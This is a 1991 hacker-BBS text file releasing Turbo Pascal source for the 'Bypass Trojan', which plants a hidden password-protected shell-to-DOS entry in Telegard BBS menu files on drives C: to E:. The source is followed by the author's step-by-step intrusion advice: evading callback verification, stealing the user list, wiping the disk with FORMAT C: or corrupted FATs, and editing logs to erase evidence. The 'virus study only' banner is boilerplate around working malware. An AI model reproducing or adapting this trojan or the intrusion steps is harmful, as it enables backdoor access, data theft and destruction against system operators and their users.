;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> Bypass Trojan v1.0 and v2.0 :

 Created by: Mechanix
 Released  : October 1991

 Introduction:

    Well this is basically another backdoor creator for Telegard Systems. This
 one is relatively fullproof except for the fact that it requires REMOTE.BAT to
 exist on the target system, or it will not function properly. However, the
 Bypass Trojan v2.0 takes care of this problem as it creates REMOTE.BAT on the
 target system, if it doesn't exist already. This is why I am also releasing
 the source (in Turbo Pascal) to the Bypass Trojan v1.0. You will find the
 source after the description.

 Description:

    This trojan will scan all directories on drives C: to E: in search of the
 MAIN.MNU file. Then it will append a few lines to the file as to create a
 hidden command to shell to DOS. It also checks to see if the MAIN.MNU file is
 Read-Only or Hidden, and will remove these attributes long enough to make the
 changes. It will also check for write-protection. The source can also be
 changed as to modify any of the .MNU files.

 Notes:

    This trojan uses a basic Turbo Pascal cycle to scan all directories and
 files, and thus the source can be modified for a number of uses. As for a good
 procedure to nail the board once the shell to DOS command has been
 implemented, I recommend the following:
  - First and foremost, use a PBX or other phreaking trick to avoid the
    annoying Maestro phone.
  - Call preferably around 4-5 am, when the SysOp is almost sure not to be
    around.
  - Use the shuttle password (if there is one) and then apply as a NEW user
    after you have bypassed the shuttle password. This will usually bypass CBV
    utilities.
  - Shell to DOS in the correct menu.
  - Turn your capture mode on, as to record everything you see.
  - Go get the user list and ZIP it up with another ZIP file that is already
    online. This way you can D/L it later when you log on again. Or capture it
    through a text file viewing utility if you find one on the system.
  - If you don't want the user list, and just want to crash the board, then
    FORMAT C: should do the trick. Or uses DEBUG to rearrange his FATs. Or if
    it's a H/P board, use one of the online virii or trojans to screw him. That
    will teach him, and you get to test them out.
  - If you decide to only take the user list and let the board live, then go
    edit the logs as to remove all evidence of your actions. If there's a spool
    to printer log, you're in trouble.
  - If you could not bypass CBV, then find that utility's log and edit out
    your number.
  - Lastly, take off the DOS shell command from the menu you modified in the
    first place, unless you want to use it again, but this is risky.

 Well that's the method I've been using, but the choice is your's.





 Source:

PROGRAM BYPASS1;
{ Bypass Trojan v1.0                                                          }
{ Created by: Mî›H’ï!X [NuKE]                                                 }
{ Created on: 27/09/91                                                        }
USES DOS;
VAR
 Target  : SEARCHREC;
 T       : TEXT;
PROCEDURE DIRECT   (PATH : STRING);
VAR
 PATH2    : STRING;
 INFO     : SEARCHREC;
 INFO2    : SEARCHREC;
 F        : TEXT;
BEGIN
 Findfirst (PATH + '\*.*',$10,INFO);
 WHILE DOSERROR = 0 DO
  BEGIN
   IF (INFO.ATTR = $10) AND (INFO.NAME[1] <> '.') THEN
    Begin
     PATH2 := PATH + '\' + INFO.NAME;
      Chdir (PATH2);
       Findfirst ('MAIN.MNU',($3F - $10),INFO2);       { Or any .MNU you wish }
       WHILE DOSERROR = 0 DO
        Begin
         ASSIGN (F,INFO2.NAME);
         Setfattr (F,$20);
         Append (F);
         Writeln (F,' ');
         Writeln (F,' ');
         Writeln (F,'#');                                        { Key to add }
         Writeln (F,' ');
         Writeln (F,'-$');
         Writeln (F,'NUKEWAR;PW: ;^8WRONG - access denied!');      { Password }
         Writeln (F,' ');
         Writeln (F,' ');
         Writeln (F,' ');
         Writeln (F,'#');                                        { Key to add }
         Writeln (F,' ');
         Writeln (F,'D-');
         Writeln (F,'REMOTE.BAT');
         Close (F);
         Findnext(INFO2);
       End;
      DIRECT (PATH2);
    End;
   Findnext(INFO);
  End;
 END;
PROCEDURE FILEFIND (DRIVE : CHAR);
BEGIN
 Chdir (DRIVE + ':\');
 Findfirst ('MAIN.MNU',($3F - $10),Target);            { Or any .MNU you wish }
 WHILE DOSERROR = 0 DO
  Begin
   ASSIGN (T,Target.name);
   Setfattr (T,$20);
   {$I-}
   Append (T);
   {$I+}
   IF IORESULT = 0 THEN
    Begin
     Writeln (T,' ');
     Writeln (T,'#');                                            { Key to add }
     Writeln (T,' ');
     Writeln (T,'-$');
     Writeln (T,'NUKEWAR;PW: ;^8WRONG - access denied!');          { Password }
     Writeln (T,' ');
     Writeln (T,' ');
     Writeln (T,' ');
     Writeln (T,'#');                                            { Key to add }
     Writeln (T,' ');
     Writeln (T,'D-');
     Writeln (T,'REMOTE.BAT');
     Close (T);
    End
   ELSE
    Exit;
   Findnext (Target);
  End;
 DIRECT  (DRIVE + ':');
END;
BEGIN
 {$I-}
 Chdir ('C:\');
 {$I+}
 IF IORESULT = 0 THEN
  FILEFIND ('C');
 {$I-}
 Chdir ('D:\');
 {$I+}
 IF IORESULT = 0 THEN
  FILEFIND ('D');
 {$I-}
 Chdir ('E:\');
 {$I+}
 IF IORESULT = 0 THEN
  FILEFIND ('E');
END.

    Well there it is. Please feel free to improve it in anyway you like. I will
 soon release the source to Bypass Trojan v2.0 which checks for REMOTE.BAT and
 creates one if needed. The REMOTE.BAT file also has the Hidden attribute to
 try and hide it from the SysOp. The reason for this, is that smart SysOps, and
 any of those who are reading this, rename the REMOTE.BAT or remove it, to
 avoid this sort of trojan. The original release is for a modem on Com2. If you
 wish to have the trojan for another device, either edit it in the .EXE, or
 contact me (Mechanix) on any [NuKE] board, and I will recompile the source for
 you with another device.

 Mechanix [NuKE]

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
